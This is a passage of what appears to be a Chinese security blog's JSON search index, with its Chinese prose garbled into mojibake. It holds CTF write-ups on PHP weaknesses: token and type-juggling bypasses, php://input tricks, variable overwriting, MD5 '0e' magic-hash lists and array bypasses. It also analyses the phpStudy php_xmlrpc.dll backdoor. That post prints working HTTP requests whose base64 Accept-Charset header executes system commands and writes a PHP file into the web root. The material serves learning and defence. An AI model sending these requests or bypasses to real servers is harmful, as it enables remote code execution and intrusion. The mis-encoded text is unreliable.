ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- è½¬å­˜è¡¨ä¸­çš„æ•°æ® `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, &#x27;****ä¸å¯è§***&#x27;, &#x27;***ä¸å¯è§***&#x27;, 0);*/........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;å¤±è´¥äº†å‘€&quot;; &#125;&#125; è¿™è¾¹$tokené•¿åº¦è¦ç­‰äº10ï¼Œ$token= 0,æ‰€ä»¥æˆ‘ä»¬æ„é€ 10ä¸ª0,0000000000 file_get_contentsé¢˜ç›®é“¾æ¥ F12,å‘ç°æºä»£ç  1234&lt;!--$file = $_GET[&#x27;file&#x27;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; file_put_contens()å‡½æ•°çš„ä½œç”¨ æˆ‘ä»¬ä½¿ç”¨burp,ç»“åˆphp://inputåè®®ï¼Œä¼ æ•°æ® æ³¨æ„ï¼Œç»“æ„å¦‚ä¸‹å›¾ å˜é‡è¦†ç›–é¢˜ç›®é“¾æ¥ F12,å‘ç°æºä»£ç  123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; GETä¼ name=meizijiu233ï¼Œä½¿å¾—$key=nameï¼Œé‚£ä¹ˆ$$key=$name,è¿™æ ·æ¥æ”¹å˜å˜é‡çš„å€¼ æ³¨æ„ï¼ï¼ è¿™ä¸ªä¸æ˜¯é¢˜ HateITåšä¸äº†å•Š,å¾…æ›´æ–°â€¦ Anonymousåšä¸äº†å•Š,å¾…æ›´æ–°â€¦ æ€»ç»“ å˜é‡è¦†ç›– è¿›åˆ¶è½¬æ¢(PHP) ä»¥ä¸Šä¸¤ç‚¹æ¯”è¾ƒç”Ÿç–ï¼ŒåŠ å¼ºç»ƒä¹ ,æœ€åï¼ŒF12æ— æ•Œ!!! æ²¡æ€è·¯å°±F12","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://bobtaoy.github.io/tags/CTF/"}]},{"title":"MD5ç¢°æ’å’ŒMD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰","slug":"MD5ç¢°æ’å’ŒMD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰","date":"2020-09-26T06:58:59.000Z","updated":"2020-09-26T07:00:12.369Z","comments":true,"path":"2020/09/26/MD5ç¢°æ’å’ŒMD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰/","link":"","permalink":"https://bobtaoy.github.io/2020/09/26/MD5%E7%A2%B0%E6%92%9E%E5%92%8CMD5%E5%80%BC(%E5%93%88%E5%B8%8C%E5%80%BC)%E7%9B%B8%E7%AD%89/","excerpt":"","text":"æ¼æ´å™è¿° PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œé€šè¿‡è¾“å…¥ä¸€ä¸ªç»è¿‡å“ˆå¸Œåä»¥â€0Eâ€å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå³ä¼šè¢«PHPè§£é‡Šä¸º0ï¼Œå¦‚æœæ•°æ®åº“ä¸­å­˜åœ¨è¿™ç§å“ˆå¸Œå€¼ä»¥â€0Eâ€å¼€å¤´çš„å¯†ç çš„è¯ï¼Œä»–å°±å¯ä»¥ä»¥è¿™ä¸ªç”¨æˆ·çš„èº«ä»½ç™»å½•è¿›å»ï¼Œå°½ç®¡å¹¶æ²¡æœ‰çœŸæ­£çš„å¯†ç ã€‚ MD5ç¢°æ’åšå—é‚®CTFçš„æ—¶å€™é‡åˆ°PHPä¸­MD5å“ˆå¸Œå€¼ç›¸ç­‰çš„é—®é¢˜ï¼Œåœ¨æ­¤åšä¸ªè®°å½•md5çš„ç¢°æ’ï¼Œåœ¨PHPçš„æ•°çš„å¤„ç†ä¸­ï¼Œ0å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆ0ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰md5ç¢°æ’ 0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 å¤§å†™å­—æ¯ç±»123456789101112131415161718192021222324252627282930313233343536QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162TUFEPMC0e839407194569345277863905212547UTIPEZQ0e382098788231234954670291303879UYXFLOI0e552539585246568817348686838809IHKFRNS0e256160682445802696926137988570PJNPDWY0e291529052894702774557631701704ABJIHVY0e755264355178451322893275696586DQWRASX0e742373665639232907775599582643DYAXWCA0e424759758842488633464374063001GEGHBXL0e248776895502908863709684713578GGHMVOE0e362766013028313274586933780773GZECLQZ0e537612333747236407713628225676NWWKITQ0e763082070976038347657360817689NOOPCJF0e818888003657176127862245791911MAUXXQC0e478478466848439040434801845361MMHUWUV0e701732711630150438129209816536 MD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰çš„é—®é¢˜å¯ä»¥ç”¨å“ˆå¸Œå€¼ç¢°æ’ï¼Œä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œå¦‚ï¼šusername[]=1&amp;password[]=2é¢˜ç›®æºä»£ç : 12345678910111213141516171819202122232425&lt;?php error_reporting(0); header(&quot;Content-Type: text/html; charset=utf-8&quot;); session_start(); if (isset($_SESSION[&#x27;CHVGCGMM_login&#x27;])) &#123; header(&#x27;Location: panel.php&#x27;); die(&#x27;ç™»å½•æˆåŠŸï¼&#x27;); &#125; $p_username = $_POST[&#x27;username&#x27;]; $p_password = $_POST[&#x27;password&#x27;]; if (isset($p_username) &amp;&amp; isset($p_password)) &#123; if ($p_username == $p_password) die(&#x27;ç”¨æˆ·åä¸å¯†ç ä¸èƒ½ç›¸åŒï¼&#x27;); if (md5($p_password) === md5($p_username)) &#123; $_SESSION[&#x27;CHVGCGMM_login&#x27;] = $p_username; header(&#x27;Location: panel.php&#x27;); die(&#x27;ç™»å½•æˆåŠŸï¼&#x27;); &#125;else&#123; die(&#x27;å¯†ç ä¸æ­£ç¡®ï¼&#x27;); &#125; &#125; ?&gt; ä¸Šé¢˜ä½¿ç”¨æ•°ç»„å³å¯ç»•è¿‡ å‚è€ƒé“¾æ¥ https://www.freebuf.com/news/67007.html https://www.cnblogs.com/Jie-Fei/p/9886598.html https://www.cnblogs.com/0yst3r-2046/p/10748412.html","categories":[{"name":"èƒ¡ä¹±å€’è…¾","slug":"èƒ¡ä¹±å€’è…¾","permalink":"https://bobtaoy.github.io/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://bobtaoy.github.io/tags/CTF/"}]},{"title":"phpstudyåé—¨åˆ†æ","slug":"phpstudyåé—¨åˆ†æ","date":"2020-09-26T05:52:36.000Z","updated":"2020-10-03T08:03:18.767Z","comments":true,"path":"2020/09/26/phpstudyåé—¨åˆ†æ/","link":"","permalink":"https://bobtaoy.github.io/2020/09/26/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/","excerpt":"","text":"é—®é¢˜æ¦‚è¿° æœ‰é—®é¢˜çš„ç‰ˆæœ¬ï¼š â€‹ é»˜è®¤è·¯åŠ² C:\\phpStudy\\PHPTutorial\\php\\php-5.2.17\\ext\\ PHPStudy phpç‰ˆæœ¬ extæ‰©å±•æ–‡ä»¶å¤¹ä¸‹ phpStudy20180211 php5.4.45 å’Œ php5.2.17 php_xmlrpc.dll phpStudy20161103 php5.4.45 å’Œ php5.2.17 php_xmlrpc.dll åé—¨æ‰€åœ¨ä½ç½®ï¼š ä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€ php_xmlrpc.dllæ–‡ä»¶ Getshellæˆ‘ä»¬é€šè¿‡burpæŠ“åŒ…è½¯ä»¶æ¥åˆ©ç”¨åé—¨ æ²¡æœ‰ä¿®æ”¹çš„è¯·æ±‚å¤´ä¿¡æ¯ 123456789GET &#x2F; HTTP&#x2F;1.1Host: 192.168.1.131Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close ä¿®æ”¹åï¼š 123456789101112GET &#x2F; HTTP&#x2F;1.1Host: 192.168.1.131Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip,deflate #deflateå‰é¢çš„ç©ºæ ¼å»æ‰Accept-charset:c3lzdGVtKCdpcGNvbmZpZycpOw&#x3D;&#x3D; # æ·»åŠ æ–°å­—æ®µï¼Œå€¼éœ€è¦base64ç¼–ç Accept-Language: zh-CN,zh;q&#x3D;0.9Connection: close æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼šc3lzdGVtKCdpcGNvbmZpZycpOw== è§£ç ä¸ºï¼šsystem(&#39;ipconfig&#39;); phpinfo å†™ä¸€å¥è¯æœ¨é©¬,åˆ©ç”¨ file_put_contents()å‡½æ•° file_put_contents(&quot;C:\\phpStudy\\PHPTutorial\\WWW\\info.php&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;); 12345678910GET &#x2F; HTTP&#x2F;1.1Host: 192.168.1.131Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.90 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3Accept-Encoding: gzip,deflateAccept-charset:ZmlsZV9wdXRfY29udGVudHMoIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1xpbmZvLnBocCIsIjw&#x2F;cGhwIHBocGluZm8oKTsgPz4iKTs&#x3D;Accept-Language: zh-CN,zh;q&#x3D;0.9Connection: close é¢„é˜²æªæ–½1.ä¿®æ”¹php.inié…ç½®æ–‡ä»¶ï¼Œæ³¨é‡Šè¿™ä¸ªæ‰©å±•æ–‡ä»¶ ä½¿ç”¨æœ€æ–°çš„phpstudy","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"}],"tags":[{"name":"phpå®‰å…¨","slug":"phpå®‰å…¨","permalink":"https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"},{"name":"phpstudyåé—¨åˆ†æ","slug":"phpstudyåé—¨åˆ†æ","permalink":"https://bobtaoy.github.io/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"}]}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"},{"name":"ä»£ç å®¡è®¡","slug":"PHP/webå®‰å…¨/ä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Python","slug":"Python","permalink":"https://bobtaoy.github.io/categories/Python/"},{"name":"èƒ¡ä¹±å€’è…¾","slug":"èƒ¡ä¹±å€’è…¾","permalink":"https://bobtaoy.github.io/categories/%E8%83%A1%E4%B9%B1%E5%80%92%E8%85%BE/"}],"tags":[{"name":"PHPä»£ç å®¡è®¡","slug":"PHPä»£ç å®¡è®¡","permalink":"https://bobtaoy.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"æº¢å‡ºæ”»å‡»","slug":"æº¢å‡ºæ”»å‡»","permalink":"https://bobtaoy.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"},{"name":"phpå®‰å…¨","slug":"phpå®‰å…¨","permalink":"https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"},{"name":"CTF","slug":"CTF","permalink":"https://bobtaoy.github.io/tags/CTF/"},{"name":"Pythonå¸¸ç”¨æ¨¡å—","slug":"Pythonå¸¸ç”¨æ¨¡å—","permalink":"https://bobtaoy.github.io/tags/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://bobtaoy.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"å¸¸ç”¨å·¥å…·","slug":"å¸¸ç”¨å·¥å…·","permalink":"https://bobtaoy.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://bobtaoy.github.io/tags/Wireshark/"},{"name":"phpstudyåé—¨åˆ†æ","slug":"phpstudyåé—¨åˆ†æ","permalink":"https://bobtaoy.github.io/tags/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"}]}